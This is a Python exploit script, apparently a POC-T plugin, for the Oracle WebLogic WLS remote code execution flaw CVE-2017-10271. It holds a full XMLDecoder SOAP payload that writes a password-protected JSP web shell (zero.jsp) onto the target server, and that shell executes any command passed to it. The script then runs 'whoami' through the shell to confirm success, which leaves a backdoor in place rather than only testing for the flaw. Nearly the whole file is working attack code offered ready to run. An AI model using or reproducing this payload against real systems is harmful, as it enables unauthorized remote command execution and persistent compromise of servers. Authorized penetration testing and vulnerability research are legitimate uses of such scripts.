#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = starnight_cyber

"""
    Script : weblogic-wls.py
    Author : starnight_cyber
    Time : 2017.1.8

    WebLogic Server WLS RCE (CVE-2017-10271):
        OracleWebLogic Server 10.3.6.0.0
        OracleWebLogic Server 12.1.3.0.0
        OracleWebLogic Server 12.2.1.1.0
        OracleWebLogic Server 12.2.1.2.0

"""

import requests

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
    "Accept-Charset": "GBK,utf-8;q=0.7,*;q=0.3",
    "Content-Type": "text/xml"
}

payload = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext
    xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><java version="1.4.0" class="java.beans.XMLDecoder">
    <void class="java.io.PrintWriter"> <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/zero.jsp</string>
    <void method="println"><string><![CDATA[<%   if("v".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    } %>]]></string></void><void method="close"/>
    </void></java></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>
'''


def poc(url):
    try:
        # Step 1: POST webshell to target, if remote system is vulnerable, it will create a zero.jsp on remote machine
        url1 = 'http://' + url + '/wls-wsat/CoordinatorPortType11'
        # print url1
        resp = requests.post(url1, data=payload, headers=headers, timeout=5)  # attack

        # Step 2 : Check whether can execute command on target
        url2 = 'http://' + url + '/bea_wls_internal/zero.jsp?pwd=v&i=whoami'
        # print url2, check this url by your hand
        resp = requests.get(url2, timeout=5)

        # check whether succeed or not
        return bool(resp.status_code == 200)

    except Exception:
        # anything wrong, return False
        return False
